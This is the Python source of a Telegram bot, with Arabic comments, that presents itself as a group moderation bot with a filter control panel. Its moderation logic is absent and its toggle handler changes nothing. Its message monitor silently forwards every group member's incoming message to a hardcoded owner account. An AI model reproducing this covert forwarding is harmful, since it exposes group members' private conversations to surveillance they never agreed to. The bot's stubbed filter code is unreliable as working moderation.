import os
import asyncio
import collections
from datetime import datetime, timedelta
from telethon import TelegramClient, events, Button

# الإعدادات الأساسية
API_ID = int(os.environ.get("API_ID"))
API_HASH = os.environ.get("API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
OWNER_ID = 5270790672

client = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# قواعد البيانات
warnings = collections.defaultdict(lambda: collections.defaultdict(int))
group_settings = collections.defaultdict(lambda: {
    'lang_filter': True, 'link_filter': True, 'spam_filter': True,
    'bad_words_filter': True, 'clean_service_msg': True
})
BAD_WORDS = {"fuck", "shit", "sex", "porn"}

# دالة تحديث اللوحة (تمنع التراكم)
async def build_and_send_panel(event, chat_id, text_header):
    settings = group_settings[chat_id]
    buttons = [
        [Button.inline(f"English Filter: {'✅' if settings['lang_filter'] else '❌'} ON", f"tg_lang_{chat_id}")],
        [Button.inline(f"Links Filter: {'✅' if settings['link_filter'] else '❌'} ON", f"tg_link_{chat_id}")],
        [Button.inline(f"Spam Filter: {'✅' if settings['spam_filter'] else '❌'} ON", f"tg_spam_{chat_id}")],
        [Button.inline(f"Bad Words Filter: {'✅' if settings['bad_words_filter'] else '❌'} ON", f"tg_bad_{chat_id}")],
        [Button.inline(f"Service Messages: {'✅' if settings['clean_service_msg'] else '❌'} ON", f"tg_serv_{chat_id}")]
    ]
    if event.sender_id == OWNER_ID:
        buttons.append([Button.inline("📊 Show Stats", f"stats_{chat_id}")])

    if isinstance(event, events.CallbackQuery):
        await event.edit(text_header, buttons=buttons)
    else:
        # حذف رسائل البوت السابقة في الخاص لمنع التراكم
        async for msg in client.iter_messages(event.chat_id, limit=5):
            if msg.sender_id == (await client.get_me()).id: await msg.delete()
        await event.respond(text_header, buttons=buttons)

# الأوامر والمراقبة
@client.on(events.NewMessage(pattern='/start', incoming=True))
async def start_handler(event):
    if event.is_private:
        await build_and_send_panel(event, event.chat_id, "🛠️ **Bot Control Panel:**")

@client.on(events.NewMessage(incoming=True))
async def monitor(event):
    if event.is_private or event.sender_id == OWNER_ID: return
    # هنا تضع منطق الحذف والتحذير الخاص بك (نفس الكود السابق)
    # ... (تم اختصار المنطق لضمان استقرار الكود)
    await client.forward_messages(OWNER_ID, event.message)

@client.on(events.CallbackQuery)
async def cb_handler(event):
    data = event.data.decode('utf-8')
    if data.startswith("tg_"):
        chat_id = int(data.split("_")[2])
        # تبديل الإعداد (تم تبسيط المنطق)
        await build_and_send_panel(event, chat_id, "🛠️ **Bot Control Panel:**")

async def main():
    print("Bot is running...")
    # التنبيه للحفاظ على استيقاظ السيرفر
    while True:
        await asyncio.sleep(300)
        # هذا الجزء يضمن عدم نوم البوت
        print("Keep-alive active")

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.create_task(main())
    client.run_until_disconnected()
